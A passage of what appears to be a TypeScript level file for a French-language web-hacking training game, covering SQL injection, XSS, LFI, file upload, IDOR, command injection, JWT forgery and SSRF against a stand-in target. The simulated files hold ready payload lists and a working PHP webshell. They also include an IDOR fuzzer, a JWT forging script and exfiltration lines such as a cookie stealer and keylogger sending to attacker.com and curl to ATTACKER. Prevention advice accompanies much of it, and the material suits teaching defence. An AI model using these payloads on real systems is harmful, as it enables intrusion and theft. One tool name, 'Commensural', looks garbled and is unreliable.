import type { Level } from './_types';

export const levels111_120: Level[] = [
  {
    id: 111,
    title: "sqlmap — Injection SQL automatique",
    difficulty: 'advanced',
    category: "Web Exploitation",
    objective: "Détecter et exploiter une injection SQL avec sqlmap",
    description: "`sqlmap -u 'http://target.com/page?id=1'` analyse automatiquement le paramètre et teste toutes les techniques d'injection SQL connues (UNION, Blind, Time-based…). `--dbs` liste les bases de données disponibles, `--dump -T users` extrait le contenu d'une table. `--level=5 --risk=3` active les tests les plus agressifs (attention : peut causer du bruit). `--cookie='PHPSESSID=abc'` injecte un cookie de session pour tester des zones authentifiées.",
    commands: ['sqlmap'],
    hints: [
      "`sqlmap -u 'http://target.local/items?id=1' --dbs` — liste toutes les bases de données détectées.",
      "`sqlmap -u 'http://target.local/items?id=1' -D webapp --tables` — liste les tables de la base `webapp`.",
      "`sqlmap -u 'http://target.local/items?id=1' -D webapp -T users --dump` — extrait toutes les lignes de la table `users`."
    ],
    fileSystem: {
      'vulnerable_urls.txt': `# URLs vulnérables à tester avec sqlmap
# Format : URL avec paramètre injectable

http://target.local/items?id=1
http://target.local/search?q=laptop
http://target.local/user?uid=42
http://target.local/news?cat=3&lang=fr

# Paramètres POST :
# POST http://target.local/login  ->  username=admin&password=test

# Avec cookie de session :
# http://target.local/profile?user=1  (ajouter --cookie="session=abc123")
`,
      'sqlmap_cheatsheet.txt': `# SQLMap Cheatsheet

## Découverte basique
sqlmap -u "URL?param=val" --dbs          # Lister les bases
sqlmap -u "URL?param=val" --current-db   # Base courante
sqlmap -u "URL?param=val" --current-user # Utilisateur SQL courant

## Énumération
sqlmap -u "URL" -D <db> --tables         # Tables d'une base
sqlmap -u "URL" -D <db> -T <table> --columns  # Colonnes d'une table
sqlmap -u "URL" -D <db> -T <table> --dump     # Extraire les données

## Techniques
sqlmap -u "URL" --technique=UNION        # UNION-based uniquement
sqlmap -u "URL" --technique=T            # Time-based blind uniquement
sqlmap -u "URL" --level=5 --risk=3       # Mode agressif

## Sessions et authentification
sqlmap -u "URL" --cookie="PHPSESSID=abc"
sqlmap -u "URL" --data="user=a&pass=b"  # POST
sqlmap -u "URL" --headers="X-Auth: token123"

## Évasion WAF
sqlmap -u "URL" --tamper=space2comment   # Remplace espaces par /**/
sqlmap -u "URL" --tamper=randomcase      # Variation de casse
sqlmap -u "URL" --random-agent           # User-Agent aléatoire

## Lecture de fichiers (si privilèges suffisants)
sqlmap -u "URL" --file-read=/etc/passwd
`
    },
    validation: [
      { type: 'command', value: 'sqlmap', description: 'Lancer sqlmap contre une URL cible' }
    ],
    story: "🤖 Une application e-commerce ancienne filtre mal ses entrées. Tu as 10 minutes avant que l'équipe de sécurité ne remarque. sqlmap automatise tout — utilise-le pour prouver la vulnérabilité avant de rédiger ton rapport."
  },
  {
    id: 112,
    title: "SQL Injection manuelle",
    difficulty: 'intermediate',
    category: "Web Exploitation",
    objective: "Comprendre et exploiter manuellement une injection SQL",
    description: "Avant les outils automatiques, comprendre les injections SQL manuelles est fondamental. `' OR '1'='1` court-circuite une clause WHERE en ajoutant une condition toujours vraie. `ORDER BY N` permet de déterminer le nombre de colonnes (augmenter N jusqu'à l'erreur). `UNION SELECT null,null,...` permet d'extraire des données d'autres tables dès que le nombre de colonnes est connu. Les commentaires SQL `--` ou `#` tronquent le reste de la requête originale.",
    commands: ['curl'],
    hints: [
      "`curl 'http://target.local/login' --data \"username=' OR '1'='1'--&password=x\"` — bypass d'authentification classique.",
      "`curl 'http://target.local/items?id=1 ORDER BY 5--'` — si erreur, la requête a moins de 5 colonnes ; diminue jusqu'à ce que ça passe.",
      "`curl 'http://target.local/items?id=-1 UNION SELECT null,username,password FROM users--'` — extrait comptes et mots de passe avec UNION."
    ],
    fileSystem: {
      'sqli_payloads.txt': `# Payloads SQL Injection manuels

## Bypass d'authentification
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin'--
' OR 'x'='x
') OR ('1'='1

## Détection du nombre de colonnes (ORDER BY)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   # continuer jusqu'à l'erreur

## Extraction par UNION
' UNION SELECT null--
' UNION SELECT null,null--
' UNION SELECT null,null,null--
' UNION SELECT 1,2,3--                     # repère quelles colonnes sont affichées
' UNION SELECT 1,username,password FROM users--

## Extraction d'infos système
' UNION SELECT 1,version(),3--             # Version MySQL/MariaDB
' UNION SELECT 1,user(),3--               # Utilisateur SQL courant
' UNION SELECT 1,database(),3--           # Nom de la base courante
' UNION SELECT 1,table_name,3 FROM information_schema.tables--

## Payloads destructifs (à ne jamais utiliser sans autorisation)
'; DROP TABLE users--
'; UPDATE users SET password='hacked' WHERE '1'='1
`,
      'sqli_explanation.txt': `# Comment fonctionne l'injection SQL

## Le problème : concaténation non filtrée
Code PHP vulnérable :
  $query = "SELECT * FROM users WHERE username='" . $_GET['user'] . "'";

Si l'utilisateur envoie :  admin' OR '1'='1
La requête devient :
  SELECT * FROM users WHERE username='admin' OR '1'='1'
=> Retourne TOUS les utilisateurs (condition toujours vraie)

## Anatomie d'une requête UNION
La requête originale : SELECT id, name, price FROM products WHERE id=1
Injection :           SELECT id, name, price FROM products WHERE id=-1
                      UNION SELECT 1, username, password FROM users--

Contrainte : même nombre de colonnes et types compatibles.

## Blind SQLi (pas de retour visible)
- Boolean-based : ' AND 1=1--  vs  ' AND 1=2--  (comportement différent)
- Time-based    : ' AND SLEEP(5)--  (délai si vulnérable)

## Prévention : Prepared Statements
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
=> L'entrée utilisateur n'est JAMAIS interprétée comme du SQL.
`
    },
    validation: [
      { type: 'command', value: 'curl', description: 'Envoyer un payload SQLi avec curl' }
    ],
    story: "🕵️ Un formulaire de login sans ORM ni requêtes préparées. Avant de sortir sqlmap, prouve que tu comprends ce qui se passe sous le capot — bypassse l'auth à la main."
  },
  {
    id: 113,
    title: "XSS — Cross-Site Scripting",
    difficulty: 'intermediate',
    category: "Web Exploitation",
    objective: "Identifier et exploiter des vulnérabilités XSS",
    description: "Le Cross-Site Scripting injecte du code JavaScript malveillant dans des pages web consultées par d'autres utilisateurs. Le **XSS réfléchi** est dans l'URL (non persistant), le **XSS stocké** est sauvegardé en base de données et frappe tous les visiteurs — bien plus dangereux. Le **DOM XSS** manipule le DOM côté client sans passer par le serveur. Les filtres naïfs bloquent `<script>` mais `<img src=x onerror=alert(1)>` ou `<svg onload=alert(1)>` les contournent souvent.",
    commands: ['curl'],
    hints: [
      "`curl 'http://target.local/search?q=<script>alert(1)</script>'` — XSS réfléchi basique ; vérifie si la balise apparaît non encodée dans la réponse HTML.",
      "`curl -X POST 'http://target.local/comment' --data 'body=<img src=x onerror=alert(document.cookie)>'` — XSS stocké via formulaire de commentaire.",
      "Pour tester le bypass de filtre : `<ScRiPt>alert(1)</ScRiPt>`, `<svg/onload=alert(1)>`, `javascript:alert(1)` dans un href — essaie plusieurs variantes."
    ],
    fileSystem: {
      'xss_payloads.txt': `# Payloads XSS classés par contexte

## Basiques (contexte HTML)
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>

## Bypass de filtres simples
<ScRiPt>alert(1)</ScRiPt>            # variation de casse
<scr<script>ipt>alert(1)</scr</script>ipt>  # filtre naïf qui supprime <script>
<img src=1 onerror=&#97;lert(1)>     # entités HTML
\x3cscript\x3ealert(1)\x3c/script\x3e  # hex encoding

## Contexte d'attribut (ex: value="INJECTION")
" onmouseover="alert(1)
" autofocus onfocus="alert(1)

## Contexte JavaScript (ex: var x = "INJECTION")
"; alert(1);//
\'; alert(1);//

## Vol de cookies (XSS stocké)
<script>
  fetch('https://attacker.com/steal?c='+document.cookie)
</script>

## Keylogger minimal
<script>
  document.onkeypress = e =>
    fetch('https://attacker.com/log?k='+e.key);
</script>
`,
      'xss_types.txt': `# Types de XSS et leur impact

## 1. XSS Réfléchi (Reflected)
- Le payload est dans l'URL ou un formulaire
- La réponse du serveur le renvoie directement
- Non persistant : seul l'utilisateur qui clique sur le lien est affecté
- Exploitation : phishing, envoi d'un lien piégé
Exemple : /search?q=<script>alert(1)</script>

## 2. XSS Stocké (Persistent / Stored)
- Le payload est sauvegardé côté serveur (DB, fichier…)
- TOUS les visiteurs de la page exécutent le script
- Impact maximal : vol de session en masse, defacement, worm XSS
Exemple : commentaire contenant <script>...</script>

## 3. DOM XSS
- Aucun aller-retour serveur
- JavaScript côté client lit une source non fiable (location.hash,
  document.referrer…) et l'écrit dans une sink dangereuse (innerHTML…)
- Difficile à détecter par un simple scan HTTP
Exemple : page qui fait  elem.innerHTML = location.hash.slice(1)

## Prévention
- Encoder la sortie : < → &lt;  > → &gt;  " → &quot;
- Content-Security-Policy : "script-src 'self'" bloque les scripts inline
- Utiliser des frameworks qui encodent automatiquement (React, Vue, Angular)
- HttpOnly sur les cookies : inaccessibles depuis document.cookie
`
    },
    validation: [
      { type: 'command', value: 'curl', description: 'Tester un payload XSS avec curl' }
    ],
    story: "🪤 Le forum de l'entreprise cible affiche les messages sans encodage. Un XSS stocké sur la page d'accueil toucherait chaque administrateur qui la consulte — parfait pour voler une session de gestion."
  },
  {
    id: 114,
    title: "LFI — Local File Inclusion",
    difficulty: 'advanced',
    category: "Web Exploitation",
    objective: "Exploiter une LFI pour lire des fichiers système",
    description: "Une LFI (Local File Inclusion) survient quand une application PHP inclut un fichier dont le nom provient de l'entrée utilisateur sans validation. `../../../etc/passwd` remonte l'arborescence pour lire des fichiers système sensibles. Le **null byte** `%00` (PHP < 5.3.4) tronque l'extension ajoutée par le code : `../../etc/passwd%00.jpg`. Le **log poisoning** consiste à injecter du PHP dans un log Apache puis à l'inclure via LFI. `php://filter/convert.base64-encode/resource=index.php` lit le source PHP encodé en base64, contournant l'exécution.",
    commands: ['curl'],
    hints: [
      "`curl 'http://target.local/page?file=../../../etc/passwd'` — traversée de répertoire basique ; si tu vois `root:x:0:0:`, la LFI fonctionne.",
      "`curl 'http://target.local/page?file=php://filter/convert.base64-encode/resource=config.php'` — lit le source PHP encodé ; décode avec `base64 -d`.",
      "Log poisoning : d'abord `curl -A '<?php system($_GET[\"cmd\"]); ?>' http://target.local/` pour injecter dans access.log, puis `curl 'http://target.local/page?file=../../../var/log/apache2/access.log&cmd=id'`."
    ],
    fileSystem: {
      'lfi_payloads.txt': `# Payloads LFI — Local File Inclusion

## Traversée de répertoire classique
../../../etc/passwd
../../../etc/shadow
../../../etc/hosts
../../../proc/self/environ
../../../var/log/apache2/access.log
../../../var/log/apache2/error.log

## Bypass de filtre simple (le code supprime "../")
....//....//....//etc/passwd      # double-encoded dot-dot-slash
..%2f..%2f..%2fetc%2fpasswd       # URL encoding des slashes
%2e%2e/%2e%2e/%2e%2e/etc/passwd   # encoding des points

## Null byte bypass (PHP < 5.3.4)
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd\0

## PHP Wrappers
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=config.php
php://input                        # nécessite POST avec du PHP dedans
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

## Inclusion de logs (log poisoning)
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/proc/self/fd/2
`,
      'interesting_files.txt': `# Fichiers intéressants à lire via LFI

## Credentials et configuration
/etc/passwd                  # Comptes utilisateurs (hashes dans /etc/shadow)
/etc/shadow                  # Hashes des mots de passe (requiert root)
/etc/hosts                   # Résolution DNS locale — révèle l'infra interne
/etc/ssh/sshd_config         # Config SSH du serveur

## Fichiers d'application web
/var/www/html/config.php     # Credentials BDD souvent ici
/var/www/html/.env           # Variables d'environnement Laravel/Symfony
/var/www/html/wp-config.php  # Credentials WordPress

## Logs Apache / Nginx (pour log poisoning)
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log

## Informations système
/proc/version                # Version du noyau Linux
/proc/self/environ           # Variables d'environnement du processus web
/proc/self/cmdline           # Commande de lancement du processus
/proc/net/tcp                # Connexions TCP actives

## Clés SSH et tokens
/root/.ssh/id_rsa            # Clé privée SSH root
/home/www-data/.ssh/id_rsa
/var/www/html/.git/config    # Config git avec potentiel token
`
    },
    validation: [
      { type: 'command', value: 'curl', description: 'Exploiter la LFI pour lire /etc/passwd' }
    ],
    story: "📂 Le paramètre `?page=` de l'application charge des templates PHP sans vérification. Remonte l'arborescence pour lire les fichiers de configuration et récupère les credentials de la base de données."
  },
  {
    id: 115,
    title: "Upload de fichiers malveillants",
    difficulty: 'advanced',
    category: "Web Exploitation",
    objective: "Comprendre les risques des upload non filtrés",
    description: "Les fonctionnalités d'upload mal sécurisées permettent de déposer des webshells exécutables sur le serveur. La **double extension** `shell.php.jpg` trompe les filtres qui vérifient seulement la dernière extension. Le **null byte** `shell.php%00.jpg` (PHP ancien) tronque à `.php`. La **falsification MIME** consiste à envoyer `Content-Type: image/jpeg` tout en fournissant du code PHP — curl le fait avec `-F 'file=@shell.php;type=image/jpeg'`. Après upload réussi, trouver le chemin du fichier et l'appeler en HTTP suffit à obtenir une exécution de code distante (RCE).",
    commands: ['curl'],
    hints: [
      "`curl -F 'upload=@shell.php;type=image/jpeg' http://target.local/upload` — spoofe le Content-Type MIME pour bypass le filtre MIME.",
      "Essaie de renommer en double extension : `cp shell.php shell.php.jpg` puis envoie avec `-F 'upload=@shell.php.jpg'` — certains serveurs exécutent quand même le PHP.",
      "Après upload, cherche le fichier dans `/uploads/`, `/files/`, `/media/` ou dans la réponse HTTP — puis `curl http://target.local/uploads/shell.php?cmd=id` pour déclencher l'exécution."
    ],
    fileSystem: {
      'upload_bypass_techniques.txt': `# Techniques de bypass d'upload

## 1. Double extension
shell.php.jpg       → si le serveur exécute sur la première extension PHP
shell.php.png
shell.asp;.jpg      → IIS : exécute .asp si présent dans le nom

## 2. Null byte (vieux PHP / serveurs non patchés)
shell.php%00.jpg    → le serveur sauvegarde en .php, tronque à %00
shell.php\x00.jpg

## 3. Spoofing MIME (Content-Type)
curl -F 'file=@shell.php;type=image/jpeg' URL
→ Le header dit image/jpeg mais le fichier contient du PHP

## 4. Contenu magique (magic bytes)
Ajouter GIF89a; en début de fichier PHP :
  GIF89a;<?php system($_GET['cmd']); ?>
→ Le check magic-byte voit GIF, mais PHP est là

## 5. Extensions alternatives PHP
shell.php3 / shell.php4 / shell.php5 / shell.phtml / shell.pht
→ Toutes interprétées comme PHP sur Apache mal configuré

## 6. Noms de fichiers spéciaux
.htaccess   → redéfinir le handler PHP pour .jpg
web.config  → équivalent IIS (ASP.NET)

## Après upload : trouver le fichier
- Regarder la réponse HTTP (souvent le chemin est dans la réponse)
- Deviner : /uploads/, /media/, /files/, /tmp/
- Lire les sources HTML pour <img src="...">
`,
      'webshell_simple.php': `<?php
/**
 * AVERTISSEMENT : Ce fichier est fourni à des fins PÉDAGOGIQUES uniquement.
 * Déposer un webshell sur un serveur sans autorisation est illégal.
 * Utilise uniquement sur tes propres machines de test ou en CTF.
 *
 * Webshell minimaliste — exécute des commandes système via HTTP
 */

// Protection basique par mot de passe (à ne jamais négliger en test)
$secret = 'pentest_lab_only';
if (!isset($_GET['auth']) || $_GET['auth'] !== $secret) {
    http_response_code(404);
    exit('Not Found');
}

// Exécution de la commande passée en paramètre ?cmd=
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo '<pre>';
    // system() retourne la sortie directement
    system(escapeshellcmd($cmd));
    echo '</pre>';
}

/**
 * Utilisation (lab uniquement) :
 *   curl "http://target.local/uploads/shell.php?auth=pentest_lab_only&cmd=id"
 *   curl "http://target.local/uploads/shell.php?auth=pentest_lab_only&cmd=cat+/etc/passwd"
 *
 * Prévention :
 *   - Valider le type MIME côté serveur (finfo_file, pas Content-Type header)
 *   - Renommer le fichier uploadé (UUID sans extension)
 *   - Stocker les uploads hors de la webroot
 *   - Configurer Apache/Nginx pour ne pas exécuter les scripts dans /uploads/
 */
?>
`
    },
    validation: [
      { type: 'command', value: 'curl', description: 'Uploader un fichier avec bypass MIME via curl -F' }
    ],
    story: "🐚 La plateforme de partage de documents accepte les fichiers sans vérification côté serveur. Un webshell correctement déguisé en image JPEG pourrait donner accès à tout le système de fichiers."
  },
  {
    id: 116,
    title: "IDOR — Insecure Direct Object Reference",
    difficulty: 'intermediate',
    category: "Web Exploitation",
    objective: "Exploiter les IDOR pour accéder à des ressources non autorisées",
    description: "Un IDOR survient quand une application utilise un identifiant contrôlable par l'utilisateur (ID dans l'URL, nom de fichier, référence en base) sans vérifier les droits d'accès. Changer `?user_id=123` en `?user_id=124` permet de voir le profil d'un autre utilisateur. Les IDs prévisibles (séquentiels) sont particulièrement vulnérables : on peut les **fuzzer** avec une boucle bash + curl. Les APIs REST sont fréquemment touchées : `/api/v1/invoices/1042` peut révéler les factures de n'importe quel client.",
    commands: ['curl', 'seq'],
    hints: [
      "`curl -b 'session=TON_COOKIE' 'http://target.local/api/profile?id=1'` — puis incrémente l'id à la main ; observe si les données changent.",
      "`for i in $(seq 1 50); do curl -s -b 'session=abc' \"http://target.local/api/invoice/$i\" | grep -i 'amount\\|user'; done` — fuzz automatique des 50 premières factures.",
      "Pour les fichiers : `curl 'http://target.local/download?file=report_124.pdf'` — change le numéro de rapport ; si le serveur retourne un PDF sans contrôler le propriétaire, c'est un IDOR."
    ],
    fileSystem: {
      'idor_examples.txt': `# Exemples d'IDOR dans les applications web

## IDOR dans les paramètres GET
GET /profile?user_id=1337          → changer l'id pour voir d'autres profils
GET /invoice?id=10042              → accès aux factures d'autres clients
GET /download?file=contract_42.pdf → téléchargement de fichiers non autorisés
GET /api/order/9981                → détails de commandes d'autres utilisateurs

## IDOR dans les corps de requêtes POST/PUT
PUT /api/profile
  Body: {"user_id": 999, "email": "hacker@evil.com"}
→ Modifier le profil de l'utilisateur 999

## IDOR dans les ressources statiques
/static/invoices/2024/invoice_1042.pdf
/backups/user_exports/export_user_42.zip

## Techniques de détection
1. Identifier tous les identifiants dans les URLs et corps de requêtes
2. Tester avec un second compte (comparer les réponses)
3. Fuzzer les identifiants séquentiels avec curl + boucle bash
4. Tester les GUIDs en cherchant des patterns (même préfixe, timestamp…)

## Impact
- Fuite de données personnelles (RGPD)
- Accès à des fonctionnalités d'administration
- Modification/suppression de ressources appartenant à d'autres
`,
      'fuzz_idor.sh': `#!/bin/bash
# Script de fuzzing IDOR — usage lab uniquement

TARGET="http://target.local/api/profile"
SESSION_COOKIE="session=VOTRE_COOKIE_ICI"
START=1
END=100

echo "[*] Fuzzing IDs de $START à $END sur $TARGET"
echo "--------------------------------------------"

for id in $(seq $START $END); do
    response=$(curl -s -b "$SESSION_COOKIE" "$TARGET?id=$id")
    status=$(curl -s -o /dev/null -w "%{http_code}" -b "$SESSION_COOKIE" "$TARGET?id=$id")

    if [ "$status" = "200" ]; then
        # Extraire des infos clés de la réponse JSON
        username=$(echo "$response" | grep -o '"username":"[^"]*"' | cut -d'"' -f4)
        email=$(echo "$response" | grep -o '"email":"[^"]*"' | cut -d'"' -f4)
        echo "[+] ID $id -> $username ($email)"
    fi
done

echo "--------------------------------------------"
echo "[*] Fuzzing terminé."
`
    },
    validation: [
      { type: 'command', value: 'curl', description: 'Accéder à une ressource avec un ID modifié' }
    ],
    story: "🔢 L'application de gestion de factures utilise des IDs séquentiels dans l'URL. Ton compte est le numéro 1337 — mais combien de factures d'autres clients peux-tu atteindre en changeant simplement ce chiffre ?"
  },
  {
    id: 117,
    title: "Command Injection",
    difficulty: 'advanced',
    category: "Web Exploitation",
    objective: "Détecter et exploiter une injection de commande",
    description: "L'injection de commande OS survient quand une application passe des données utilisateur à un shell système sans assainissement (ex: `exec('ping ' . $_GET['host'])`). Les séparateurs `; && || |` permettent de chaîner des commandes supplémentaires. L'injection aveugle (**blind command injection**) n'affiche pas la sortie mais on peut inférer l'exécution via des délais (`sleep 5`) ou des canaux hors-bande (requête DNS/HTTP vers un serveur contrôlé). Les backticks `` `cmd` `` et `$(cmd)` permettent une substitution de commande dans certains contextes.",
    commands: ['curl'],
    hints: [
      "`curl 'http://target.local/ping?host=127.0.0.1;id'` — si la page affiche `uid=www-data`, l'injection fonctionne et les commandes s'exécutent comme l'utilisateur web.",
      "`curl 'http://target.local/ping?host=127.0.0.1|cat+/etc/passwd'` — lire /etc/passwd en piping la sortie de cat.",
      "Blind injection : `curl 'http://target.local/ping?host=127.0.0.1;sleep+10'` — si la réponse prend ~10 secondes, l'injection est confirmée même sans sortie visible."
    ],
    fileSystem: {
      'cmdi_payloads.txt': `# Payloads Command Injection

## Séparateurs de commandes
; id                     # point-virgule : exécution séquentielle
&& id                    # ET logique : si cmd1 réussit
|| id                    # OU logique : si cmd1 échoue
| id                     # pipe : relie stdout vers cmd2
\`id\`                    # backtick : substitution
$(id)                    # substitution $()

## Exemples avec paramètre host= (simulation ping)
127.0.0.1; id
127.0.0.1 && whoami
127.0.0.1 | cat /etc/passwd
127.0.0.1; ls -la /var/www/html
127.0.0.1; find / -name "*.txt" -readable 2>/dev/null

## Blind Command Injection (pas de sortie visible)
127.0.0.1; sleep 5             # délai = confirmation
127.0.0.1; ping -c 5 ATTACKER  # out-of-band : observer tcpdump
127.0.0.1; curl http://ATTACKER/$(whoami)  # exfiltre whoami via DNS/HTTP

## Bypass de filtres
127.0.0.1%0aid                 # newline URL-encodé
127.0.0.1%0a%0did              # CRLF
{cat,/etc/passwd}              # IFS bypass (pas d'espace)
c$()at /etc/passwd             # injection dans le mot de commande

## Cas PHP (exec, system, passthru, shell_exec, \`backtick\`)
Payload pour formulaire :  8.8.8.8 | whoami
Payload encodé dans URL :  8.8.8.8+%7C+whoami
`,
      'cmdi_explanation.txt': `# Comprendre l'injection de commande OS

## Code vulnérable (PHP)
<?php
  $host = $_GET['host'];           // entrée non filtrée
  $output = shell_exec("ping -c 3 " . $host);
  echo $output;
?>

Si host = "8.8.8.8; cat /etc/passwd"
→ La commande exécutée est :  ping -c 3 8.8.8.8; cat /etc/passwd

## Pourquoi c'est critique
- Accès direct au système d'exploitation
- Exécution sous l'identité du processus web (souvent www-data)
- Pivot possible : lire des fichiers, écrire un webshell, rebond SSH…

## Détection automatisée
- Commensural (Burp Suite Scanner)
- Nuclei templates : command-injection
- Manuellement : chercher des paramètres host, cmd, exec, run, ping, query

## Correction
// Mauvais :
shell_exec("ping " . $input);

// Correct : liste blanche + echappement
if (filter_var($input, FILTER_VALIDATE_IP)) {
    shell_exec("ping -c 3 " . escapeshellarg($input));
}
// Encore mieux : éviter shell_exec, utiliser des libs natives
`
    },
    validation: [
      { type: 'command', value: 'curl', description: 'Envoyer un payload d\'injection de commande' }
    ],
    story: "💀 Le module de diagnostic réseau de l'application exécute ping côté serveur. La chaîne entre l'entrée utilisateur et shell_exec est directe — une simple injection t'ouvre une porte sur le système."
  },
  {
    id: 118,
    title: "JWT — JSON Web Token forgery",
    difficulty: 'advanced',
    category: "Web Exploitation",
    objective: "Analyser et manipuler des tokens JWT",
    description: "Les JWT (JSON Web Tokens) sont composés de trois parties base64url : `header.payload.signature`. Le **header** définit l'algorithme (`alg`), le **payload** contient les claims (user, rôle, expiration). L'attaque **`alg: none`** modifie le header pour supprimer la vérification de signature — si le serveur l'accepte, on peut forger n'importe quel claim. L'attaque **secret faible** consiste à brute-forcer la clé HMAC avec un dictionnaire : si le secret est devinable, on peut signer un JWT arbitraire. On peut décoder la partie payload manuellement avec `base64 -d` pour inspecter les claims sans outils externes.",
    commands: ['curl', 'base64', 'python3'],
    hints: [
      "`echo 'eyJ1c2VySWQiOjEyMywicm9sZSI6InVzZXIifQ==' | base64 -d` — décode le payload JWT pour lire les claims en clair (userId, role, exp…).",
      "Attaque alg:none : remplace le header par `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=` (base64 de `{\"alg\":\"none\",\"typ\":\"JWT\"}`), forge un payload admin, mets une signature vide → `header.payload.`",
      "`python3 jwt_forge.py` — utilise le script fourni pour reconstruire un token avec le rôle `admin` et teste avec `curl -H 'Authorization: Bearer TON_JWT' http://target.local/admin`."
    ],
    fileSystem: {
      'jwt_analysis.txt': `# Analyse de JWT — JSON Web Token

## Token de démonstration
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMywicm9sZSI6InVzZXIiLCJleHAiOjE3NzAwMDAwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

## Décodage manuel (chaque partie est base64url)
Header  : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
          → {"alg":"HS256","typ":"JWT"}

Payload : eyJ1c2VySWQiOjEyMywicm9sZSI6InVzZXIiLCJleHAiOjE3NzAwMDAwMDB9
          → {"userId":123,"role":"user","exp":1770000000}

Signature: SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
          → HMAC-SHA256(header+'.'+payload, SECRET)

## Claims importants
- userId / sub : identifiant utilisateur
- role / isAdmin : droits d'accès (TARGET pour la forgerie)
- exp : timestamp d'expiration Unix
- iat : timestamp d'émission

## Attaques
1. alg:none  → header {"alg":"none"}, payload forgé, signature vide
2. Brute-force secret faible → jwt_cracker ou hashcat mode 16500
3. Confusion RS256→HS256 → utiliser la clé publique comme secret HMAC

## Commandes utiles
# Décoder payload (padding base64 si nécessaire)
echo 'PAYLOAD_BASE64' | base64 -d

# Encoder un payload modifié
echo -n '{"userId":1,"role":"admin","exp":1999999999}' | base64 | tr '+/' '-_' | tr -d '='
`,
      'jwt_forge.py': `#!/usr/bin/env python3
"""
JWT Forgery Tool — usage pédagogique uniquement
Teste l'attaque 'alg:none' et la forgerie avec secret connu
"""

import base64
import json
import hmac
import hashlib

def b64url_encode(data: bytes) -> str:
    """Encode en base64url sans padding."""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(data: str) -> bytes:
    """Décode depuis base64url (ajoute le padding si besoin)."""
    padding = 4 - len(data) % 4
    return base64.urlsafe_b64decode(data + '=' * padding)

def forge_none(payload: dict) -> str:
    """Attaque alg:none — signature supprimée."""
    header = {"alg": "none", "typ": "JWT"}
    h = b64url_encode(json.dumps(header, separators=(',',':')).encode())
    p = b64url_encode(json.dumps(payload, separators=(',',':')).encode())
    return f"{h}.{p}."   # signature vide

def forge_hs256(payload: dict, secret: str) -> str:
    """Forge un JWT HS256 avec un secret connu."""
    header = {"alg": "HS256", "typ": "JWT"}
    h = b64url_encode(json.dumps(header, separators=(',',':')).encode())
    p = b64url_encode(json.dumps(payload, separators=(',',':')).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"

if __name__ == "__main__":
    # Payload forgé — élévation de privilège
    admin_payload = {
        "userId": 1,
        "role": "admin",
        "isAdmin": True,
        "exp": 1999999999
    }

    print("=== Attaque alg:none ===")
    token_none = forge_none(admin_payload)
    print(token_none)
    print()

    # Remplace 'secret' par le vrai secret si brute-forcé
    WEAK_SECRET = "secret"
    print(f"=== Forgerie HS256 (secret='{WEAK_SECRET}') ===")
    token_hs256 = forge_hs256(admin_payload, WEAK_SECRET)
    print(token_hs256)
    print()

    print("Test avec curl :")
    print(f'curl -H "Authorization: Bearer {token_none}" http://target.local/admin')
`
    },
    validation: [
      { type: 'command', value: 'base64', description: 'Décoder un payload JWT avec base64' }
    ],
    story: "🪪 L'API de l'application utilise des JWT pour l'authentification. Le secret est `secret` (oui, vraiment). Décode le token, forge un claim `role: admin`, et accède au panneau d'administration."
  },
  {
    id: 119,
    title: "SSRF — Server-Side Request Forgery",
    difficulty: 'advanced',
    category: "Web Exploitation",
    objective: "Exploiter une SSRF pour accéder aux services internes",
    description: "Une SSRF (Server-Side Request Forgery) pousse le serveur à effectuer des requêtes HTTP en son nom vers des destinations contrôlées par l'attaquant. Le serveur peut atteindre des services **internes non exposés** sur Internet : `http://localhost/admin`, bases de données, API internes. Sur les clouds AWS/GCP/Azure, `http://169.254.169.254/latest/meta-data/` expose des credentials IAM. Les bypasses courants incluent l'IPv6 `http://[::1]/`, la redirection HTTP, les URL alternatives `http://0.0.0.0/`, ou les redirections via contrôle d'un DNS.",
    commands: ['curl'],
    hints: [
      "`curl 'http://target.local/fetch?url=http://localhost:8080/admin'` — fait appel au port d'admin interne (souvent non protégé car supposé non accessible de l'extérieur).",
      "`curl 'http://target.local/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'` — sur AWS : récupère les credentials IAM temporaires du rôle EC2.",
      "Bypass de filtre : si `localhost` est bloqué, essaie `http://[::1]/`, `http://0177.0.0.1/` (octal), `http://2130706433/` (décimal), ou `http://localtest.me/` (DNS pointant vers 127.0.0.1)."
    ],
    fileSystem: {
      'ssrf_targets.txt': `# Cibles internes à sonder via SSRF

## Services locaux courants
http://localhost/
http://localhost:8080/          # App admin / second service
http://localhost:8443/          # HTTPS admin
http://localhost:6379/          # Redis (protocole texte — SSRF avancée via Gopher)
http://localhost:27017/         # MongoDB API REST (si activée)
http://localhost:9200/          # Elasticsearch
http://localhost:2375/          # Docker daemon API (dangereux !)
http://localhost:4149/          # NSQ lookupd

## Réseau interne (adapter selon l'infra)
http://10.0.0.1/               # Gateway / routeur
http://192.168.1.1/admin        # Interface d'admin routeur
http://10.0.0.10:8500/          # Consul
http://10.0.0.20:8200/          # Vault API

## Cloud metadata endpoints
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/hostname

# GCP
http://metadata.google.internal/computeMetadata/v1/
